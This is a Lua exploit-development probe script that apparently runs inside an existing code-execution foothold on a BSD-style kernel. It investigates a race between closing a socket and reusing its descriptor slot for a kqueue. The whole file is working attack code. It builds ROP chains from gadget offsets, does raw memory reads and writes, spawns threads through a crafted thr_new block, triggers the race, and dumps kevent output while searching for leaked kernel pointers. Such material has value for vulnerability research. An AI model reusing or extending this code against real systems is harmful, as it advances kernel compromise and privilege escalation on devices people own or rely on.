-- CRASH_CLASS: MODERATE
-- PROBE 93e4: Kqueue close race - isolated investigation
--
-- 93e3 Section B crashed: child close(fd0) + kqueue() while main polls fd0.
-- The crash suggests the kqueue allocation reused the fd slot and poll
-- touched the kqueue file object as if it were a socket.
--
-- This probe:
-- A) Reproduces with fewer iterations and captures pre-crash state
-- B) Checks if poll on a reused-kqueue fd leaks kernel pointers
-- C) Tries kevent on the reused fd to see cross-object operations

print("=== PROBE 93e4: KQUEUE CLOSE RACE (isolated) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(32); wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local par_lo, par_hi = eoff(0x992)
local pdr_lo, pdr_hi = eoff(0xC9DFE)
local psr_lo, psr_hi = eoff(0xD77D)
local prdx_lo, prdx_hi = eoff(0x3B02D7)
local bret_lo, bret_hi = eoff(0x42)
local mwr_lo, mwr_hi = eoff(0x92C67)
local stub_lo, stub_hi = split(stub)

local function spawn_child(calls, done_addr)
    local tcb = memory.alloc(0x1000)
    local tcb_a = N(tcb); local tcb_lo, tcb_hi = split(tcb)
    for i = 0, 0xFF8, 8 do wd(tcb_a + i, tcb_lo); wd(tcb_a + i + 4, tcb_hi) end
    local fs_ptr = memory.alloc(8)
    wd(N(fs_ptr), tcb_lo); wd(N(fs_ptr) + 4, tcb_hi)
    local fsptr_lo, fsptr_hi = split(N(fs_ptr))
    local done_lo, done_hi = split(done_addr)
    local stk = memory.alloc(0x200000)
    local sb = N(stk); local ss = 0x100000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    local pos = 0
    local function put(lo, hi) wd(rsp + pos*8, lo); wd(rsp + pos*8 + 4, hi or 0); pos = pos + 1 end
    put(pdr_lo, pdr_hi); put(129, 0)
    put(psr_lo, psr_hi); put(fsptr_lo, fsptr_hi)
    put(par_lo, par_hi); put(165, 0)
    put(stub_lo, stub_hi)
    for _, c in ipairs(calls) do
        if #c >= 2 then put(pdr_lo, pdr_hi); local l,h = split(c[2]); put(l, h) end
        if #c >= 3 then put(psr_lo, psr_hi); local l,h = split(c[3]); put(l, h) end
        if #c >= 4 then put(prdx_lo, prdx_hi); local l,h = split(c[4]); put(l, h) end
        put(par_lo, par_hi); put(c[1], 0)
        put(stub_lo, stub_hi)
    end
    put(par_lo, par_hi); put(0xD09E93E4, 0)
    put(pdr_lo, pdr_hi); put(done_lo, done_hi)
    put(mwr_lo, mwr_hi)
    put(pdr_lo, pdr_hi); put(0, 0)
    put(par_lo, par_hi); put(431, 0)
    put(stub_lo, stub_hi)
    local par = memory.alloc(0x40); local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb)); wq(pa + 0x18, uint64(ss))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa + 0x30, tid)
    local ok1, rv1 = pcall(function() return mk(455)(par, uint64(0x38)) end)
    return ok1 and N(rv1) == 0
end

-- ======== SECTION A: Sequential baseline (no race) ========
-- Close fd, then kqueue, then poll the old fd number. No race needed.
print("--- Section A: Sequential close+kqueue+poll (no race) ---")

for iter = 1, 5 do
    if not alive() then print("DEAD"); break end
    local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), sv) end)
    local fd0 = rd(N(sv)) or -1
    local fd1 = rd(N(sv)+4) or -1
    if fd0 < 0 then print("socketpair failed"); break end

    -- Close fd0 from main thread
    pcall(function() mk(6)(uint64(fd0)) end)

    -- Open kqueue - should reuse fd0's slot
    local ok_kq, kqfd = pcall(function() return mk(362)() end)
    local kq = ok_kq and N(kqfd) or -1

    -- Now poll the original fd0 number
    local pollfd = memory.alloc(16)
    wd(N(pollfd), fd0)
    wd(N(pollfd) + 4, 0x0001)  -- POLLIN
    local ok_p, rv_p = pcall(function()
        return mk(209)(uint64(N(pollfd)), uint64(1), uint64(0))
    end)
    local poll_ret = ok_p and N(rv_p) or -999
    if poll_ret >= 0x80000000 then poll_ret = poll_ret - 0x100000000 end
    local revents_raw = rd(N(pollfd) + 4) or 0
    local rev_hi = math.floor(revents_raw / 0x10000) % 0x10000

    print(string.format("  iter %d: fd0=%d kq=%d poll=%d revents=0x%04X",
        iter, fd0, kq, poll_ret, rev_hi))

    pcall(function() mk(6)(uint64(fd1)) end)
    if kq >= 0 then pcall(function() mk(6)(uint64(kq)) end) end
end

-- ======== SECTION B: Race with careful output ========
-- Child closes fd0, main immediately does kqueue() + poll(fd0)
print("")
print("--- Section B: Race with output capture ---")

for iter = 1, 10 do
    if not alive() then print("DEAD at iter " .. iter); break end

    local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), sv) end)
    local fd0 = rd(N(sv)) or -1
    local fd1 = rd(N(sv)+4) or -1
    if fd0 < 0 then break end

    local done = memory.alloc(8); wd(N(done), 0)
    -- Child: close(fd0) only
    local spawned = spawn_child({{6, fd0}}, N(done))

    if spawned then
        -- Main: immediately try kqueue() to grab fd0's slot
        local ok_kq, kqfd = pcall(function() return mk(362)() end)
        local kq = ok_kq and N(kqfd) or -1

        -- Now poll fd0 with zero timeout
        local pollfd = memory.alloc(16)
        wd(N(pollfd), fd0)
        wd(N(pollfd) + 4, 0x0001)
        local ok_p, rv_p = pcall(function()
            return mk(209)(uint64(N(pollfd)), uint64(1), uint64(0))
        end)
        local poll_ret = ok_p and N(rv_p) or -999
        if poll_ret >= 0x80000000 then poll_ret = poll_ret - 0x100000000 end
        local revents_raw = rd(N(pollfd) + 4) or 0
        local rev_hi = math.floor(revents_raw / 0x10000) % 0x10000

        -- Wait for child
        for w = 1, 100000 do if (rd(N(done)) or 0) ~= 0 then break end end

        -- Check if kqueue got fd0's number (slot reuse)
        local reused = (kq == fd0)
        print(string.format("  iter %d: fd0=%d kq=%d reused=%s poll=%d rev=0x%04X",
            iter, fd0, kq, tostring(reused), poll_ret, rev_hi))

        -- If reused, try kevent on fd0 to see cross-type behavior
        if reused then
            local kev = memory.alloc(64)
            -- struct kevent: ident(8), filter(2), flags(2), fflags(4), data(8), udata(8)
            wq(N(kev), uint64(fd1))      -- ident = fd1
            wd(N(kev)+8, 0xFFFF0001)     -- filter=EVFILT_READ(-1)=0xFFFF, flags=EV_ADD=1
            wd(N(kev)+12, 0)
            wq(N(kev)+16, uint64(0))
            wq(N(kev)+24, uint64(0))

            local outev = memory.alloc(64)
            for j = 0, 60, 4 do wd(N(outev)+j, 0xDEAD0000 + j) end

            local ok_ke, rv_ke = pcall(function()
                return mk(363)(uint64(fd0), uint64(N(kev)), uint64(1),
                    uint64(N(outev)), uint64(1), uint64(0))
            end)
            local ke_ret = ok_ke and N(rv_ke) or -999
            if ke_ret >= 0x80000000 then ke_ret = ke_ret - 0x100000000 end

            -- Dump output kevent for kernel pointers
            print(string.format("    kevent ret=%d", ke_ret))
            if ke_ret > 0 then
                for j = 0, 28, 4 do
                    local v = rd(N(outev)+j) or 0
                    print(string.format("    outev+%02X: 0x%08X", j, v))
                end
            end
        end

        if kq >= 0 and kq ~= fd0 then pcall(function() mk(6)(uint64(kq)) end) end
    end

    pcall(function() mk(6)(uint64(fd1)) end)
    pcall(function() mk(6)(uint64(fd0)) end)
end

-- ======== SECTION C: What if we DON'T do kqueue, just close? ========
-- Reproduce 93e2 baseline to confirm clean behavior
print("")
print("--- Section C: Close-only baseline ---")
local baseline_ok = 0
for iter = 1, 10 do
    if not alive() then break end
    local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), sv) end)
    local fd0 = rd(N(sv)) or -1; local fd1 = rd(N(sv)+4) or -1
    if fd0 < 0 then break end
    local done = memory.alloc(8); wd(N(done), 0)
    local spawned = spawn_child({{6, fd0}}, N(done))
    if spawned then
        local pollfd = memory.alloc(16)
        wd(N(pollfd), fd0); wd(N(pollfd)+4, 0x0001)
        local ok_p, rv_p = pcall(function()
            return mk(209)(uint64(N(pollfd)), uint64(1), uint64(100))
        end)
        for w = 1, 100000 do if (rd(N(done)) or 0) ~= 0 then break end end
        baseline_ok = baseline_ok + 1
    end
    pcall(function() mk(6)(uint64(fd1)) end)
end
print(string.format("baseline: %d/10 clean", baseline_ok))

print("")
print("alive=" .. tostring(alive()))
print("=== 93e4 COMPLETE ===")
